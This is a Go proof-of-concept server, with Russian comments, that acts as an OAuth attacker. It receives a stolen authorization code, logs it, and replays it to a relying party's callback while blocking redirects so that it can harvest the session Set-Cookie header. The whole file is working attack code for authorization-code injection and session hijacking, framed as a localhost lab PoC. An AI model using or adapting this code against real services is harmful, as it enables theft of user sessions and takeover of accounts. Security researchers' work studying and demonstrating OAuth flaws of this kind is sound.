package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
)

const rpCallback = "http://127.0.0.1:8000/oauth/callback"

func main() {
	mux := http.NewServeMux()

	mux.HandleFunc("/", home)
	mux.HandleFunc("/callback", callback)
	mux.HandleFunc("/capture", capture)

	log.Println("PoC listening on http://127.0.0.1:9000")

	if err := http.ListenAndServe(":9000", mux); err != nil {
		log.Fatal(err)
	}
}

func home(w http.ResponseWriter, r *http.Request) {
	fmt.Fprint(w, `


	
		<h1>PoC server</h1>
		<p>Laboratory server.</p>
	`)
}

func callback(w http.ResponseWriter, r *http.Request) {
	code := r.URL.Query().Get("code")

	if code == "" {
		http.Error(w, "missing code", http.StatusBadRequest)
		return
	}

	log.Println("================================")
	log.Println("[PoC] authorization code:")
	log.Println(code)
	log.Println("================================")

	// Сервер атакующего сам обращается
	// к callback confidential RP.
	//
	// Это принципиальный момент PoC.

	target := rpCallback + "?" + url.Values{
		"code": []string{code},
	}.Encode()

	req, err := http.NewRequest(
		http.MethodGet,
		target,
		nil,
	)
	if err != nil {
		http.Error(w, err.Error(), 500)
		return
	}

	client := &http.Client{
		// Не следуем за redirect автоматически.
		//
		// Нам интересно увидеть Set-Cookie
		// непосредственно в response RP.
		CheckRedirect: func(
			req *http.Request,
			via []*http.Request,
		) error {
			return http.ErrUseLastResponse
		},
	}

	resp, err := client.Do(req)
	if err != nil {
		http.Error(w, err.Error(), 500)
		return
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)

	log.Println("[PoC] RP status:", resp.Status)

	// Вот ключевой момент.
	setCookie := resp.Header.Get("Set-Cookie")

	log.Println("[PoC] Set-Cookie:")
	log.Println(setCookie)

	fmt.Fprintf(w, `
		<h1>Attack result</h1>

		<p>RP returned HTTP %d</p>

		<h2>Set-Cookie</h2>

		<pre>%s</pre>

		<h2>Body</h2>

		<pre>%s</pre>
	`,
		resp.StatusCode,
		setCookie,
		body,
	)
}

// Получаем украденный authorization code.
func capture(w http.ResponseWriter, r *http.Request) {
	code := r.URL.Query().Get("code")

	if code == "" {
		http.Error(
			w,
			"missing code",
			http.StatusBadRequest,
		)

		return
	}

	log.Println()
	log.Println("======================================")
	log.Println("[PoC] AUTHORIZATION CODE RECEIVED")
	log.Println(code)
	log.Println("======================================")

	//
	// После получения code атакующий сервер
	// сам вызывает RP callback.
	//
	go completeOAuth(code)

	fmt.Fprint(w, "authorization code captured")
}

func completeOAuth(code string) {
	log.Println("[PoC] Calling RP callback...")

	params := url.Values{}

	params.Set("code", code)

	target := rpCallback + "?" + params.Encode()

	req, err := http.NewRequest(
		http.MethodGet,
		target,
		nil,
	)

	if err != nil {
		log.Println("[PoC] request creation:", err)
		return
	}

	client := &http.Client{

		// НЕ следуем за redirect.
		//
		// Нам нужен именно response от RP,
		// содержащий Set-Cookie.
		CheckRedirect: func(
			req *http.Request,
			via []*http.Request,
		) error {
			return http.ErrUseLastResponse
		},
	}

	resp, err := client.Do(req)

	if err != nil {
		log.Println("[PoC] RP request:", err)
		return
	}

	defer resp.Body.Close()

	log.Println("[PoC] RP status:", resp.Status)

	log.Println()
	log.Println("======================================")
	log.Println("[PoC] COOKIE")
	log.Println(resp.Header.Values("Set-Cookie"))
	log.Println("======================================")
}
